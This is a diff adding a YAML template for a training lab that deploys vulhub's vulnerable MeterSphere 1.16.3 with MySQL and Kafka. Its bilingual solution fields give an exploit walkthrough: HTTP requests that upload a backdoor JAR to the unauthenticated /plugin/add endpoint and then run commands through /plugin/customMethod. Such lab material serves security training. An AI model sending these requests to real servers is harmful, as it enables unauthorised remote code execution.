@@ -1,0 +1,187 @@
+apiVersion: hivora/v1
+kind: Template
+metadata:
+  slug: vulhub-metersphere-plugin-rce
+  name: MeterSphere Plugin Endpoint Remote Code Execution
+  version: 1.0.0
+  category: security-lab
+  tags:
+  - vulhub
+  - metersphere
+  description: MeterSphere — MeterSphere Plugin Endpoint Remote Code Execution (vulhub).
+  links:
+    site: https://github.com/vulhub/vulhub/tree/master/metersphere/plugin-rce
+  maintainer: vulhub
+  license: MIT (vulhub)
+  source: https://github.com/vulhub/vulhub/tree/master/metersphere/plugin-rce
+  lab:
+    phase: exploitation
+    cves: []
+    os:
+    - linux
+    tech:
+    - metersphere
+    - rce
+    difficulty: medium
+    summary: MeterSphere Plugin Endpoint Remote Code Execution
+    solution:
+      fr: |
+        Adresse : IP:port affichés par le panel (les ports du guide sont ceux d'origine de vulhub), ou l'IP du lab sur le port d'origine via le VPN labo. Guide d'origine (anglais) : https://github.com/vulhub/vulhub/tree/master/metersphere/plugin-rce
+        MeterSphere is a one-stop open source continuous testing platform under the GPL v3 open source license.
+        In the version v1.16.3 and before, MeterSphere's plugin API is unauthenticated and the attackers are able to upload plugins to the server and execute arbitrary code.
+        References:
+        - <https://xz.aliyun.com/t/10772>
+        # Vulnerable environment
+        Execute following command to start a MeterSphere server v1.16.3:
+        $ docker compose up -d
+        After the server is fully initialized, you can see the login page of MeterSphere on `http://your-ip:8081`.
+        # Exploit
+        Firstly, by visiting `http://your-ip:8081/plugin/list`, you can see that the success message is returned without being redirected to the login page, indicating that the plugin API can be accessed without authorization.
+        Then, you should create a crafted evil plugin. Vulhub prepares a pre-built backdoor jar for it: <https://github.com/vulhub/metersphere-plugin-Backdoor/releases/tag/v1.1.0>.
+        Upload the evil jar plugin to `/plugin/add` interface:
+        $ POST /plugin/add HTTP/1.1
+        $ Host: localhost:8081
+        $ Accept-Encoding: gzip, deflate
+        $ Accept: */*
+        $ Accept-Language: en-US;q=0.9,en;q=0.8
+        $ User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36
+        $ Connection: close
+        $ Cache-Control: max-age=0
+        $ Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJV2KX1EL5qmKWXsd
+        $ Content-Length: 11985
+        $ ------WebKitFormBoundaryJV2KX1EL5qmKWXsd
+        $ Content-Disposition: form-data; name="file"; filename="Evil.jar"
+        $ [Paste your jar file]
+        $ ------WebKitFormBoundaryJV2KX1EL5qmKWXsd--
+        > **Take care of bytes encoding by yourself if you use Burpsuite to send the package.**
+        Althrough there is an error message is respond, the JAR package path is already added into URL classloader which means we can exploit it.
+        Use following request to execute arbitrary command:
+        $ POST /plugin/customMethod HTTP/1.1
+        $ Host: localhost:8081
+        $ Accept-Encoding: gzip, deflate
+        $ Accept: */*
+        $ Accept-Language: en-US;q=0.9,en;q=0.8
+        $ User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36
+        $ Connection: close
+        $ Cache-Control: max-age=0
+        $ Content-Type: application/json
+        $ Content-Length: 89
+        $ {
+        $   "entry": "org.vulhub.Evil",
+        $   "request": "id"
+        $ }
+      en: |
+        Address: the IP:port shown by the panel (the guide's ports are vulhub's original ones), or the lab's IP on the original port through the labs VPN. Original guide: https://github.com/vulhub/vulhub/tree/master/metersphere/plugin-rce
+        MeterSphere is a one-stop open source continuous testing platform under the GPL v3 open source license.
+        In the version v1.16.3 and before, MeterSphere's plugin API is unauthenticated and the attackers are able to upload plugins to the server and execute arbitrary code.
+        References:
+        - <https://xz.aliyun.com/t/10772>
+        # Vulnerable environment
+        Execute following command to start a MeterSphere server v1.16.3:
+        $ docker compose up -d
+        After the server is fully initialized, you can see the login page of MeterSphere on `http://your-ip:8081`.
+        # Exploit
+        Firstly, by visiting `http://your-ip:8081/plugin/list`, you can see that the success message is returned without being redirected to the login page, indicating that the plugin API can be accessed without authorization.
+        Then, you should create a crafted evil plugin. Vulhub prepares a pre-built backdoor jar for it: <https://github.com/vulhub/metersphere-plugin-Backdoor/releases/tag/v1.1.0>.
+        Upload the evil jar plugin to `/plugin/add` interface:
+        $ POST /plugin/add HTTP/1.1
+        $ Host: localhost:8081
+        $ Accept-Encoding: gzip, deflate
+        $ Accept: */*
+        $ Accept-Language: en-US;q=0.9,en;q=0.8
+        $ User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36
+        $ Connection: close
+        $ Cache-Control: max-age=0
+        $ Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJV2KX1EL5qmKWXsd
+        $ Content-Length: 11985
+        $ ------WebKitFormBoundaryJV2KX1EL5qmKWXsd
+        $ Content-Disposition: form-data; name="file"; filename="Evil.jar"
+        $ [Paste your jar file]
+        $ ------WebKitFormBoundaryJV2KX1EL5qmKWXsd--
+        > **Take care of bytes encoding by yourself if you use Burpsuite to send the package.**
+        Althrough there is an error message is respond, the JAR package path is already added into URL classloader which means we can exploit it.
+        Use following request to execute arbitrary command:
+        $ POST /plugin/customMethod HTTP/1.1
+        $ Host: localhost:8081
+        $ Accept-Encoding: gzip, deflate
+        $ Accept: */*
+        $ Accept-Language: en-US;q=0.9,en;q=0.8
+        $ User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36
+        $ Connection: close
+        $ Cache-Control: max-age=0
+        $ Content-Type: application/json
+        $ Content-Length: 89
+        $ {
+        $   "entry": "org.vulhub.Evil",
+        $   "request": "id"
+        $ }
+requirements:
+  arch:
+  - amd64
+form:
+  basic:
+  - id: port_8081
+    group:
+      fr: Accès
+      en: Access
+    label: web 8081/tcp
+    type: port
+    default: 8081
+  - id: port_5005
+    group:
+      fr: Accès
+      en: Access
+    label: web 5005/tcp
+    type: port
+    default: 5005
+services:
+  web:
+    role: main
+    image: vulhub/metersphere
+    tag: 1.16.3@sha256:bbb09dbc998388798eb1c0a40c304d8b44e4118607cb2d3c8e34931dc092d095
+    frozen: true
+    env:
+      MYSQL_SERVER: db:3306
+      MYSQL_DB: metersphere
+      MYSQL_USERNAME: root
+      MYSQL_PASSWORD: root
+      KAFKA_SERVER: kafka:9092
+    ports:
+    - container: 8081
+      host: '{{ form.port_8081 }}'
+      protocol: tcp
+      purpose: web
+      exposure: lan
+    - container: 5005
+      host: '{{ form.port_5005 }}'
+      protocol: tcp
+      purpose: other
+      exposure: lan
+  db:
+    role: database
+    image: mysql
+    tag: 5.7@sha256:4bc6bc963e6d8443453676cae56536f4b8156d78bae03c0145cbe47c2aad73bb
+    frozen: true
+    env:
+      MYSQL_ROOT_PASSWORD: root
+      MYSQL_DATABASE: metersphere
+    command: --sql-mode="STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION" --max-connections=8000
+  kafka:
+    role: sidecar
+    image: apache/kafka
+    tag: 3.7.0@sha256:41c20d65b0a2180b9deca056d47540771752e69fe9225d5748dd65a25a9675d7
+    frozen: true
+    env:
+      KAFKA_NODE_ID: '1'
+      KAFKA_PROCESS_ROLES: broker,controller
+      KAFKA_CONTROLLER_QUORUM_VOTERS: 1@kafka:9093
+      KAFKA_LISTENERS: PLAINTEXT://:9092,CONTROLLER://:9093
+      KAFKA_ADVERTISED_LISTENERS: PLAINTEXT://kafka:9092
+      KAFKA_LISTENER_SECURITY_PROTOCOL_MAP: CONTROLLER:PLAINTEXT,PLAINTEXT:PLAINTEXT
+      KAFKA_CONTROLLER_LISTENER_NAMES: CONTROLLER
+      KAFKA_INTER_BROKER_LISTENER_NAME: PLAINTEXT
+      KAFKA_OFFSETS_TOPIC_REPLICATION_FACTOR: '1'
+update:
+  strategy: manual
+access:
+  web: http://{{ host.lan_ip }}:{{ form.port_8081 }}
